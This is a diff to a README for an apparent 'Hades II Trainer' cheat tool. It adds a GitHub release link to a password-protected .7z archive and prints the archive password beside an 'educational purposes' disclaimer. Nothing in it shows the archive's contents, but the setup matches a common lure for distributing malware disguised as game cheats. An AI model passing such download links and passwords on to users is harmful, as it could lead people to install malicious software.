@@ -7,7 +7,7 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Hades-II-Trainer]()**
+🔗 **[Download Hades-II-Trainer](https://github.com/Pulseliwatch/Hades-II-Trainer/releases/download/hades/HadesTrai.7z)**
 
 **Password:** `trainer2026`
 
@@ -20,6 +20,8 @@
 ⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk. Hades II does not have anti-cheat, but use responsibly.
 
 ---
+
+
 
 ## ✨ Features
 
